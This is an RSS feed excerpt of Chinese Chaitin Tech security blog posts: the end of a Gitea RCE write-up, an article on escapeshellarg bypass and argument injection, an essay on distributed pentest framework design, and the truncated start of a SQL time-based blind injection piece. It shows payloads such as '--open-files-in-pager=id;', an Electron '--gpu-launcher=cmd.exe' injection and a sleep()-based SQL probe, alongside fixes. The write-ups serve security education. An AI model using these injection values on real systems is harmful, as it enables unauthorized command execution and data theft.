src=&quot;https://pic2.zhimg.com/v2-4017029fca44f5c49c9db47e4c205686_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;499&quot; data-rawheight=&quot;90&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-4017029fca44f5c49c9db47e4c205686&quot; data-watermark-src=&quot;v2-ca1d8fa8d7a91e678ced68b07f33c4a6&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;h2&gt;&lt;br&gt;&lt;a href=&quot;https://www.leavesongs.com/PENETRATION/gitea-remote-command-execution.html#_4&quot;&gt;一些思考&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;&lt;br&gt;整个漏洞链非常流畅，Go Web端的代码审计也非常少见，在传统漏洞越来越少的情况下，这些好思路将给安全研究者带来很多不一样的突破。&lt;br&gt;不过漏洞作者给出的POC实在是比较烂，基本离开了他自己的环境就不能用了，而且我也不建议用一键化的漏洞利用脚本来复现这个漏洞，原因是这个漏洞的利用涉及到一些不确定量，比如：&lt;/p&gt;&lt;ol&gt;&lt;li&gt;gitea的$GITEA_CUSTOM，这个值影响到读取app.ini的那段POC&lt;/li&gt;&lt;li&gt;管理员的用户名和ID，这个可能需要猜。但其实我们也没必要必须伪造管理员的session，我们可以伪造任意一个用户的session，然后进入网站后再找找看看有没有管理员所创建的项目，如果有的话，就可以得知管理员的用户名了。&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;另外，复现漏洞的时候也遇到过一些坑，比如gitea第一次安装好，如果不重启的话，他的session是存储在内存里的。只有第一次重启后，才会使用文件session，这一点需要注意。&lt;br&gt;如果目标系统使用的是sqlite做数据库，我们可以直接下载其数据库，并拿到他的密码哈希和另一个随机字符串，利用这两个值其实能直接伪造管理员的cookie（名为gitea_incredible），这一点我就不写了，大家可以自己查看文档。&lt;/p&gt;&lt;p&gt;&lt;/p&gt;</description>
<author>小蘑菇</author>
<guid isPermaLink="false">2018-07-16-39835913</guid>
<pubDate>Mon, 16 Jul 2018 00:00:00 +0800</pubDate>
</item>
<item>
<title>谈escapeshellarg绕过与参数注入漏洞</title>
<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/2018-05-08-36591451.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/36591451&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-b381f753958bcf64068ff996bf76ca7b_r.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;参数注入漏洞是指，在执行命令的时候，用户控制了命令中的某个参数，并通过一些危险的参数功能，达成攻击的目的。&lt;/p&gt;&lt;h2&gt;0x01 从gitlist 0.6.0远程命令执行漏洞说起&lt;/h2&gt;&lt;p&gt;我们从gitlist说起，gitlist是一款使用PHP开发的图形化git仓库查看工具。在其0.6.0版本中，存在一处命令参数注入问题，可以导致远程命令执行漏洞。&lt;/p&gt;&lt;p&gt;在用户对仓库中代码进行搜索的时候，gitlist将调用&lt;code class=&quot;inline&quot;&gt;git grep&lt;/code&gt;命令：&lt;/p&gt;&lt;code lang=&quot;php&quot;&gt;&amp;lt;?php
public function searchTree($query, $branch)
{
    if (empty($query)) {
        return null;
    }
    $query = escapeshellarg($query);
    try {
        $results = $this-&amp;gt;getClient()-&amp;gt;run($this, &quot;grep -i --line-number {$query} $branch&quot;);
    } catch (\RuntimeException $e) {
        return false;
    }
&lt;/code&gt;&lt;p&gt;其中，&lt;code class=&quot;inline&quot;&gt;$query&lt;/code&gt;是搜索的关键字，&lt;code class=&quot;inline&quot;&gt;$branch&lt;/code&gt;是搜索的分支。&lt;/p&gt;&lt;p&gt;如果用户输入的&lt;code class=&quot;inline&quot;&gt;$query&lt;/code&gt;的值是&lt;code class=&quot;inline&quot;&gt;--open-files-in-pager=id;&lt;/code&gt;，将可以执行&lt;code class=&quot;inline&quot;&gt;id&lt;/code&gt;命令：&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-025b25bf8f104854898807714b9dac55_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;665&quot; data-rawheight=&quot;74&quot; data-watermark=&quot;&quot; data-original-src=&quot;&quot; data-watermark-src=&quot;&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;h2&gt;0x02 escapeshellarg为什么没有奏效？&lt;/h2&gt;&lt;p&gt;导致这个漏洞的原因，有几点：&lt;/p&gt;&lt;ol&gt;&lt;li&gt;开发者对于&lt;code class=&quot;inline&quot;&gt;escapeshellarg&lt;/code&gt;函数的误解，造成参数注入&lt;/li&gt;&lt;li&gt;&lt;code class=&quot;inline&quot;&gt;git grep&lt;/code&gt;的参数&lt;code class=&quot;inline&quot;&gt;--open-files-in-pager&lt;/code&gt;的值，将被直接执行&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;理论上，在经过&lt;code class=&quot;inline&quot;&gt;$query = escapeshellarg($query);&lt;/code&gt;处理后，&lt;code class=&quot;inline&quot;&gt;$query&lt;/code&gt;将变成一个由单引号包裹的字符串。但不出漏洞的前提是，这个字符串应该出现在“参数值”的位置，而不是出现在参数选项（option）中。&lt;/p&gt;&lt;p&gt;我们可以试一下如下命令：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;git grep -i --line-number -e &#39;--open-files-in-pager=id;&#39; master&lt;/code&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-9e039e85772fc4b3f1b3116e17c215c5_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;700&quot; data-rawheight=&quot;168&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-9e039e85772fc4b3f1b3116e17c215c5&quot; data-watermark-src=&quot;v2-c6f61d88a48b22311344485e716be6ab&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;如上图，我将&lt;code class=&quot;inline&quot;&gt;$query&lt;/code&gt;放在了&lt;code class=&quot;inline&quot;&gt;-e&lt;/code&gt;参数的值的位置，此时它就仅仅是一个字符串而已，并不会被当成参数&lt;code class=&quot;inline&quot;&gt;--open-files-in-pager&lt;/code&gt;。&lt;/p&gt;&lt;p&gt;这应该作为本漏洞的最佳修复方法，也是git官方对pattern可能是用户输入的情况的一种解决方案（以下说明来自man-page）：&lt;/p&gt;&lt;blockquote&gt;-e &lt;br&gt;The next parameter is the pattern. This option has to be used for patterns starting with - and should be used in scripts passing user input to grep. Multiple patterns are combined by&lt;br&gt;or.&lt;/blockquote&gt;&lt;p&gt;当然，gitlist的开发者用了另一种修复方案：&lt;/p&gt;&lt;code lang=&quot;php&quot;&gt;&amp;lt;?php
public function searchTree($query, $branch)
{
    if (empty($query)) {
        return null;
    }
    $query = preg_replace(&#39;/(--?[A-Za-z0-9\-]+)/&#39;, &#39;&#39;, $query);
    $query = escapeshellarg($query);
    try {
        $results = $this-&amp;gt;getClient()-&amp;gt;run($this, &quot;grep -i --line-number -- {$query} $branch&quot;);
    } catch (\RuntimeException $e) {
        return false;
    }&lt;/code&gt;&lt;p&gt;首先用&lt;code class=&quot;inline&quot;&gt;preg_replace&lt;/code&gt;将&lt;code class=&quot;inline&quot;&gt;-&lt;/code&gt;开头的非法字符移除，然后将&lt;code class=&quot;inline&quot;&gt;$query&lt;/code&gt;拼接在&lt;code class=&quot;inline&quot;&gt;--&lt;/code&gt;的后面。&lt;/p&gt;&lt;p&gt;在命令行解析器中，&lt;code class=&quot;inline&quot;&gt;--&lt;/code&gt;的意思是，此后的部分不会再包含参数选项（option）：&lt;/p&gt;&lt;blockquote&gt;A -- signals the end of options and disables further option processing. Any arguments after the -- are treated as filenames and arguments. An argument of - is equivalent to --.&lt;br&gt;If arguments remain after option processing, and neither the -c nor the -s option has been supplied, the first argument is assumed to be the name of a file containing shell commands. If bash is invoked in this fashion, $0 is set to the name of the file, and the positional parameters are set to the remaining arguments. Bash reads and executes commands from this file, then exits. Bash&#39;s exit status is the exit status of the last command executed in the script. If no commands are executed, the exit status is 0. An attempt is first made to open the file in the current directory, and, if no file is found, then the shell searches the directories in PATH for the script.&lt;/blockquote&gt;&lt;p&gt;举个简单的例子，如果我们需要查看一个文件名是&lt;code class=&quot;inline&quot;&gt;--name&lt;/code&gt;的文件，我们就不能用&lt;code class=&quot;inline&quot;&gt;cat --name&lt;/code&gt;来读取，也不能用&lt;code class=&quot;inline&quot;&gt;cat &#39;--name&#39;&lt;/code&gt;，而必须要用&lt;code class=&quot;inline&quot;&gt;cat -- --name&lt;/code&gt;。从这个例子也能看出，单引号并不是区分一个字符串是“参数值”或“选项”的标准。&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-294baf61c56ec7cfecbf9d00ddfb1ecc_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;471&quot; data-rawheight=&quot;215&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-294baf61c56ec7cfecbf9d00ddfb1ecc&quot; data-watermark-src=&quot;v2-288a066ec9e202cacdac47f1babf7524&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;所以官方这个修复方案也是可以接受的，只不过第一步的&lt;code class=&quot;inline&quot;&gt;preg_replace&lt;/code&gt;有点影响正常搜索功能。&lt;/p&gt;&lt;h2&gt;0x03 这不是PHP的专利&lt;/h2&gt;&lt;p&gt;熟悉PHP语言的同学一定对PHP执行命令的方法感受深刻，PHP内置的命令执行函数（如&lt;code class=&quot;inline&quot;&gt;shell_exec&lt;/code&gt;、&lt;code class=&quot;inline&quot;&gt;system&lt;/code&gt;），都只接受一个“字符串”作为参数。而在内核中，这个字符串将被直接作为一条shell命令来调用，这种情况下就极为容易出现命令注入漏洞。&lt;/p&gt;&lt;p&gt;由于这个特点，PHP特别准备了两个过滤函数：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;escapeshellcmd&lt;/li&gt;&lt;li&gt;escapeshellarg&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;二者分工不同，前者为了防止用户利用shell的一些技巧（如分号、反引号等），执行其他命令；后者是为了防止用户的输入逃逸出“参数值”的位置，变成一个“参数选项”。&lt;/p&gt;&lt;p&gt;但我在0x02中也已经说清楚了，如果开发者在拼接命令的时候，将&lt;code class=&quot;inline&quot;&gt;$query&lt;/code&gt;直接给拼接在“参数选项”的位置上，那用escapeshellarg也就没任何效果了。&lt;/p&gt;&lt;p&gt;Java、Python等语言，执行命令的方法相对来说更加优雅：&lt;/p&gt;&lt;code lang=&quot;python&quot;&gt;import subprocess

query = &#39;id&#39;
r = subprocess.run([&#39;git&#39;, &#39;grep&#39;, &#39;-i&#39;, &#39;--line-number&#39;, query, &#39;master&#39;], cwd=&#39;/tmp/vulhub&#39;)&lt;/code&gt;&lt;p&gt;默认情况下，python的subprocess接受的是一个列表。我们可以将用户输入的query放在列表的一项，这样也就避免了开发者手工转义query的工作，也能从根本上防御命令注入漏洞。但可惜的是，python帮开发者做的操作，也仅仅相当于是PHP中的escapeshellarg。我们可以试试令query等于&lt;code class=&quot;inline&quot;&gt;--open-files-in-pager=id;&lt;/code&gt;：&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-60e865d895273fd01be970c244f0dcca_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;794&quot; data-rawheight=&quot;176&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-60e865d895273fd01be970c244f0dcca&quot; data-watermark-src=&quot;v2-57cc73211fb0b0cb22c5fef181756722&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;可见，仍然是存在参数注入漏洞的。原因还是0x02中说的原因，你把query放在了“参数选项”的位置上，无论怎么过滤，或者换成其他语言，都不可能解决问题。&lt;/p&gt;&lt;h2&gt;0x04 举一反三&lt;/h2&gt;&lt;p&gt;参数注入的例子还比较多，因为大部分的开发者都能理解命令注入的原理，但处理了命令注入后，往往都会忽略参数注入的问题。&lt;/p&gt;&lt;p&gt;最典型是案例是&lt;a href=&quot;https://github.com/vulhub/vulhub/blob/master/wordpress/pwnscriptum/README.md&quot;&gt;Wordpress PwnScriptum漏洞&lt;/a&gt;，PHP mail函数的第五个参数，允许直接注入参数，用户通过注入&lt;code class=&quot;inline&quot;&gt;-X&lt;/code&gt;参数，导致写入任意文件，最终getshell。&lt;/p&gt;&lt;p&gt;另一个典型的例子是&lt;a href=&quot;https://github.com/vulhub/vulhub/tree/master/php/CVE-2012-1823&quot;&gt;php-cgi CVE-2012-1823&lt;/a&gt; ，在cgi模式中，用户传入的querystring将作为cgi的参数传给php-cgi命令。而php-cgi命令可以用-d参数指定配置项，我们通过指定&lt;code class=&quot;inline&quot;&gt;auto_prepend_file=php://input&lt;/code&gt;，最终导致任意代码执行。&lt;/p&gt;&lt;p&gt;客户端上也出现过类似的漏洞，比如&lt;a href=&quot;https://github.com/vulhub/vulhub/tree/master/electron/CVE-2018-1000006&quot;&gt;Electron CVE-2018-1000006&lt;/a&gt;，我们通过注入参数&lt;code class=&quot;inline&quot;&gt;--gpu-launcher=cmd.exe /c start calc&lt;/code&gt;，来让electron内置的chromium执行任意命令。electron的最早给出的缓解措施也是在拼接点前面加上“--”。&lt;/p&gt;</description>
<author>周佩雨</author>
<guid isPermaLink="false">2018-05-08-36591451</guid>
<pubDate>Tue, 08 May 2018 00:00:00 +0800</pubDate>
</item>
<item>
<title>浅谈分布式渗透测试框架的落地实践</title>
<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/2018-04-16-35751510.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/35751510&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-75d02d21eee1d643ab4ad34ea0c0bd33_r.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;作者： &lt;a class=&quot;member_mention&quot; href=&quot;http://www.zhihu.com/people/af8bd4cc442c1349ed0f46baff19e3fd&quot; data-hash=&quot;af8bd4cc442c1349ed0f46baff19e3fd&quot; data-hovercard=&quot;p$b$af8bd4cc442c1349ed0f46baff19e3fd&quot;&gt;@v1ll4n&lt;/a&gt; &lt;/p&gt;&lt;p&gt;安全研发工程师，现就职于长亭科技，喜欢喵喵&lt;/p&gt;&lt;blockquote&gt;“本文读起来依旧还是非常枯燥”&lt;/blockquote&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;0x00 Intro&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;本文基于上一篇文章&lt;a href=&quot;https://zhuanlan.zhihu.com/p/28781870&quot;&gt;《浅谈分布式渗透框架的架构与设计》&lt;/a&gt;的内容，并且实践了在上一篇文章中提到的各种想法和设计，勉勉强强算是落地实现。当然意料之中地会遇到各种各样的问题，不管最后解决方案是优雅还是丑陋，对今后的工作和兴趣开发都是很有益的经验积累。本文就简单谈一些关于项目研发落地实践出现的各种矛盾和启示。&lt;/p&gt;&lt;p&gt;&lt;b&gt;Quick Look&lt;/b&gt;：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;业务需求模型特异性 vs 原始数据多样性&lt;/li&gt;&lt;li&gt;系统设计伪需求 vs Over-Designed&lt;/li&gt;&lt;li&gt;Service-Oriented Architecture vs 耦合痛点&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;以上几个话题在下面的文章中都会涉及到，并没有先后顺序。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;0x01 业务需求模型特异性 vs 原始数据多样性&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;在项目中，业务创造直接的价值，各种用户接口和相关交互都是建立在业务的基础上的；然而我们都知道，在我们文章中的这类系统有一个很大的特点：原始数据多且复杂，而且随着功能单元的增加，如果想要每一个功能单元产生的结果都能得到妥善处理，我认为有两种解决方案：&lt;/p&gt;&lt;ol&gt;&lt;li&gt;Formatter 或 API 协定：为每一个功能单元的结果（为每一类结果）都设定一个 Formatter 去直接转换为业务需求的结果；或者与原始数据约定 API。&lt;/li&gt;&lt;li&gt;数据转换协议或数据获取协议：设定数据转换协议或数据获取协议，Producer 和 Consumer 同时遵守一定规范，Producer 不需要关心 Consumer 到底想要什么样的模型，他只提供符合协议的中间模型，同样， Consumer 不关心接口怎么样，他想要的在中间模型中都可以拿得到。&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;这两种方案都可以一定程度上缓解 &lt;b&gt;业务需求模型特异性与原始数据多样性之间的矛盾&lt;/b&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;Formatter 或 API 协定&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;Q：为什么这两种方式会被并列来讲？有什么关联吗？&lt;/p&gt;&lt;p&gt;A：从本质上来说，这两种方式都是多样性向特异性妥协而产生的解决方案。何谓“妥协”？与需求方沟通或者协商其实就已经算是妥协了。当然这并不是说妥协不好，毕竟沟通成本也是一大成本。&lt;/p&gt;&lt;p&gt;值得另外提的是，业务的需求方并不一定是后端的用户接口层，当然原始数据的生产者也并不一定是整个系统的底层：这样的矛盾也同样存在于前后端。传统的前后端开发，需要一定的 API 规范（可能使用 Swagger 去规范 Rest API）去处理前端业务与后端原始数据的适配，前端需要的模型的特异性同样会和后端提供原始数据产生矛盾。&lt;/p&gt;&lt;p&gt;我相信虽然说 Rest API 或者其他什么的方案会解决一部分这类前后端协作开发上的问题，但是有一个隐藏矛盾是很难处理的，也会上这一个矛盾更加严重：&lt;/p&gt;&lt;p&gt;&lt;b&gt;日益增长的客户业务方需求与现阶段旧的模型之间矛盾&lt;/b&gt;&lt;/p&gt;&lt;p&gt;其实约定固定的模型 API 或者编写固定 Formatter 这种方式，是很难解决需求增长导致的特异性加重的问题的，也就意味着：&lt;/p&gt;&lt;p&gt;&lt;b&gt;新的需求 &amp;gt;&amp;gt; 新的 API &amp;gt;&amp;gt; 新的沟通与协商&lt;/b&gt;&lt;/p&gt;&lt;p&gt;我相信，每个 Coder 都比较想砍死需求改来改去和新需求分分钟冒出来的产品经理，对嘛？&lt;/p&gt;&lt;h2&gt;&lt;b&gt;设定数据转换协议或者数据获取协议&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;这种方法其实是可以极大程度上缓解在上一种方法中提到的&lt;/p&gt;&lt;blockquote&gt;日益增长的客户业务方需求与现阶段旧的模型之间矛盾&lt;/blockquote&gt;&lt;p&gt;Q：这种方法和上一种有什么本质区别？&lt;/p&gt;&lt;p&gt;A：表面上看其实最大的不同是增加了一个中间模型，但是恰恰是这一个中间模型，会让需求方洞悉原始数据所有可以提供的数据，并且不需要通过每一个需求都约定 API，而是直接在中间模型上构建业务模型；除非新的需求并不是在现有的原始数据上可以满足的，这个时候才需要进行沟通，扩充中间模型。本质上来说，原始数据的多样性不需要频繁向业务数据进行妥协。&lt;/p&gt;&lt;p&gt;这种解决方案其实也并不只是一种设想，在某些领域和工程应用中已经实现，并且取得了非常良好的开发体验；笔者认为这种科学的方法其实本来就已经被很好实践和理论化（Proxy-Pattern）了：&lt;/p&gt;&lt;ol&gt;&lt;li&gt;AMQP 中 Exchange 的设计&lt;/li&gt;&lt;li&gt;GraphQL 设计&lt;/li&gt;&lt;/ol&gt;&lt;h2&gt;&lt;b&gt;0x02 系统设计伪需求 vs Over-designed&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;Over-designed 就是过度设计，是在进行实现的时候没有正确把握复杂度导致了多余的设计。&lt;/p&gt;&lt;p&gt;其实在这个话题中，“伪需求” 与 Over-designed 的矛盾并不只发生在调度系统中，反而是在很多地方，都会发生 Over-desighed 的问题。&lt;/p&gt;&lt;ul&gt;&lt;li&gt;底层想提供更多的 Useless 的功能导致底层 Over-designed &lt;/li&gt;&lt;li&gt;应用服务处理不好 Infrastructures 与业务逻辑之间的关系导致 Over-designed&lt;/li&gt;&lt;li&gt;被高估的可靠性需求导致 Over-designed&lt;/li&gt;&lt;li&gt;hype-driven development&lt;/li&gt;&lt;li&gt;...&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;在这个话题中，我们其实很难像第一个话题一样，提出明确的方法去缓解“伪需求”带来的 Over-designed。从一开始接触 Code 直到现在，我一直难以抛弃掉一个信念，就是对自己代码过分的高估和多业务的过分高估。我觉得这其实更多的是一种诱惑，比如 HDD（Hype-Driven Development）对我来说一直是很大的诱惑。&lt;/p&gt;&lt;p&gt;当然我在这个话题中说到的“伪需求”并不是产品经理说的“业务伪需求”，而是对系统的某一个 Feature 没有做到正确估计其紧急程度或者可靠程度，凭空给自己增加了一些“负担”。这样的问题很容易导致代码冗余，过分追求设计；或者因为自己觉得这个 Feature 相关联的别的 Feature 可能需要在不久的未来实现，而自己花了更多的精力和时间在并不是这一阶段的工作上。我管这种“伪需求”叫作“负担”其实是不太妥当的，他其实并不是真的负担，反而有时候，对于一个热爱编程的 Coder 来说，它会成为一种有毒的诱惑。&lt;/p&gt;&lt;p&gt;学会抵制诱惑不去 Over-designed，学会”大道至简“我相信对于每一个 Coder 来说都会是一个漫长的过程。&lt;/p&gt;&lt;p&gt;说到这个，可能需要再讲一个例子：微服务有一万种美好的特性，但是真的所有的系统都使用微服务就一定好吗？恐怕这里是有很大问题的。服务簇的维护需要成本，服务的研发也需要成本，科学的协议设计，配置中心，协调中心，DevOps 都需要成本。一个 Passion Coder 自然是非常热爱这种 Cloud Native 和诸多特性的新技术，但是没有团队或者团队资源不够，人不够，都没有办法支撑微服务这种高复杂度的分布式系统；另外，更需要值得思考的是，你正在开发的系统值不值得微服务？当然，可能你的需求方突然砍掉了很多很多功能，你的系统突然不需要微服务了，因此你需不需要推倒重来？还是简单转为 SOA？这些其实都是一个合格的 Coder 需要思考的问题，并不只是学习新技术，采用新特性。&lt;/p&gt;&lt;blockquote&gt;&lt;a href=&quot;https://aadrake.com/posts/2017-05-20-enough-with-the-microservices.html&quot;&gt;https://aadrake.com/posts/2017-05-20-enough-with-the-microservices.html&lt;/a&gt;&lt;/blockquote&gt;&lt;p&gt;所以我管这个叫作“诱惑”，反而，越是对技术追求越多越是容易受到 Over-designed 的影响。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;0x03 Service-Oriented Architecture vs 耦合痛点&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;耦合这个词伴随我第一次程序设计课程一直到现在，从微观代码的类之间的耦合一直到服务之间耦合，设计上的耦合，甚至配置之间的耦合，一步一步走来；从思考中，也有了很多解决方法，不管有没有付诸实现，我觉得这些都是很有价值的值得讨论的问题。&lt;/p&gt;&lt;p&gt;本文描述的场景是结合上一篇文章使用了消息队列作为通信基础服务，服务之间通信需要通过消息队列。因此，基本上所有的服务之间的耦合应该是必须有通信协议耦合的，这是必须的，我们在这个 Topic 中讨论其他的问题：&lt;/p&gt;&lt;h2&gt;&lt;b&gt;不能在数据模型上耦合&lt;/b&gt;&lt;/h2&gt;&lt;blockquote&gt;A：“我负责的这个服务的数据怎么传给你呢？”&lt;br&gt;B：“要不我把 Postgres 的端口暴露出来，你直接写到数据库吧”&lt;br&gt;A：“Models 就看 Git 上我的代码，COPY 到你那里就可以”&lt;br&gt;完成之后，过了几天，因为需求变动，数据模型需要修改……&lt;br&gt;B：“我需要改 Models，你那里可能也需要改改代码”&lt;br&gt;A：“…猫猫碰.jpg”&lt;br&gt;B：“我的 Migration 怎么老有问题？是不是 A 动了 Models？”&lt;br&gt;A：“..不，我没有，别瞎说啊.jpg”&lt;/blockquote&gt;&lt;p&gt;这样的对话，确确实实是现实中发生的，这个数据模型牵扯到了两个不同的服务在开发过程中，定义的修改，Feature 和需求的增加，都会导致直接的与这个模型相关联的服务的代码的改动；造成这样的问题只是起初为了方便两个服务之间传输数据。&lt;/p&gt;&lt;p&gt;那么既然已经有了通信系统，为什么不能用来定义通信协议来传输数据呢，维护一套耦合方式总要比同时兼顾通信协议和数据库更轻松吧。另外在数据库耦合会造成更多奇奇怪怪的问题，比如：一方使用 ORM 一方没有使用 ORM，或者双方 ORM 对数据库不同的操作导致冲突，甚至说任意一个服务在数据库操作上的小问题都会影响到其他服务。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;配置中心的必要性&lt;/b&gt;&lt;/h2&gt;&lt;blockquote&gt;A：“需要测试环境改点配置，我们的 MQ 服务器迁移了”&lt;br&gt;B：“那么几个节点的配置可能都需要改动之后重新启动”&lt;br&gt;A：“Orz……求一发批量操作脚本”&lt;/blockquote&gt;&lt;p&gt;我想不只是我们，可能所有的项目都会遇到这种问题，内网一个服务的迁移直接导致了大批配置文件需要改动；某一项配置的改动，需要牵连一大批配置文件内容的修改。&lt;/p&gt;&lt;p&gt;当然，IP 迁移的问题相对来说还是比较好解决的，只需要内网 DNS 可以解析到新迁移的机器上就可以了；但是某一项配置的改动导致的关联问题，可并不是那么容易能解决的。&lt;/p&gt;&lt;p&gt;当然也并不是没有办法解决：配置中心和正确的配置中心客户端就可以解决这种问题。（如果你的配置中心也要迁移，那就爱莫能助了吧）&lt;/p&gt;&lt;p&gt;配置中心其实也并不只是可以用来关系配置，服务的注册，自动发现，甚至一些服务基础信息的同步，集群管理都可以通过配置中心来做。在实践中，Etcd 和 Zookeeper 应用的相对比较多，以 Zookeeper 为例，在我个人的使用中其实无所谓你本身应用服务究竟是什么语言编写，Zookeeper 客户端一般都有相应的语言绑定，在 acl 和 ZK 配置得当的情况下，完全可以做到保持配置文件或者关键数据在分布式系统中的一致性，热更新，热迁移，并且保证一定的安全性。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;公共代码的耦合与 Infrastructure&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;除了上面提到的更多的上层的耦合的问题，在大型项目中代码的耦合问题虽然更不引人注意，但是可能存在的隐患依然是充满威胁。最具有代表性的例子其实就是一些基础设施公用库的问题，这些封装成了公共库的代码其实也是在迭代更新的，因此，如果说因为某一个服务的特殊需求导致公用代码的接口变动，可能会导致其他服务使用公用库的代码也要发生变动。&lt;/p&gt;&lt;p&gt;但是也并不意味着这样的问题是难以避免的，就公用代码而言，要避免这种尴尬的问题，比较好的方式其实是锁版本。没错，内部公用的代码库的发布也应该是有版本的，在一个服务 Stable 的时候，他的使用的公用代码库和基础设施的库一样都是锁定版本，避免因为公用代码的更新导致服务出现异常。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;0x04 Outro&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;当然在实际的项目中，遇到的问题并不只这么多。在本文我只是特意选择了三个很具有代表性的方面来发表一些自己拙劣的见解，希望可以抛砖引玉，引来大佬一起交流 ;-)&lt;/p&gt;</description>
<author>小蘑菇</author>
<guid isPermaLink="false">2018-04-16-35751510</guid>
<pubDate>Mon, 16 Apr 2018 00:00:00 +0800</pubDate>
</item>
<item>
<title>一种新型SQL时间盲注攻击探索</title>
<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/2018-04-03-35245598.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/35245598&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-0cd460758b08a7f1950d7ee754c468f5_r.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;作者： &lt;a class=&quot;member_mention&quot; href=&quot;http://www.zhihu.com/people/879a0dd1ccf71649de0eeb3327f42f59&quot; data-hash=&quot;879a0dd1ccf71649de0eeb3327f42f59&quot; data-hovercard=&quot;p$b$879a0dd1ccf71649de0eeb3327f42f59&quot;&gt;@do9gy&lt;/a&gt; &lt;/p&gt;&lt;p&gt;现就职于长亭科技，长期从事渗透测试，WAF攻防对抗工作，喜欢小狗。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;SQL注入漏洞由来已久，关于盲注方面一直都是安全爱好者喜欢研究的话题。记得最早了解到DNS外传的思路是在oldjun的博客，当时被这种技巧所吸引，不过该方法依赖于mysql版本和window环境的限制。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;首先介绍一下什么是SQL盲注&lt;/h2&gt;&lt;blockquote&gt;在SQL注入中，往往需要引入“超出预期”的SQL语句，最好是希望将“额外”的查询内容直接显示在页面上，使用的手法有：“报错查询（error-based）”、“联合查询（union-select）”。对于无法直接回显出内容的情况需要依赖true／false差异判断（boolean）、时间对比（time-based）、DNS外传数据查询（data exfiltration through DNS channel）等方法进行捕获。例如：“select if(user()=&#39;root@localhost&#39;,sleep(4),null)“ 当网站用户是”root@localhost“时，会延长4秒钟后返回结果，当用户不是”root@localhost“时，会立即返回，由此可以判断系统中的用户，利用同样的方法可以猜测出权限范围内所有数据库所有表中存放的内容。&lt;/blockquote&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;关于mysql时间类型（time-based）的注入，一直以来众所周知的有三种方法——sleep、benchmark、笛卡尔积。所以许多市面上的WAF产品也是基于此类规则去防护的。&lt;/p&gt;&lt;p&gt;但是sql时间类型的盲注本质是&lt;b&gt;利用插入的SQL语句执行造成时间延迟&lt;/b&gt;，所以只要可以大于平均网络延迟2倍以上，就可以作为执行成功的判断依据，而大多数网站的平均响应时间在100ms以内，所以我们需要制造能达到200ms以上的时间延长的语句。&lt;/p&gt;&lt;p&gt;今天我们要提到的一个mysql函数是 get_lock函数，先来看一下mysql文档中对其的描述：&lt;/p&gt;&lt;p&gt;GET_LOCK(str,timeout)&lt;/p&gt;&lt;p&gt;Tries&lt;br&gt;to obtain a lock with a name given by the string str, using a timeout of&lt;br&gt;timeout seconds. A negative timeout value means infinite 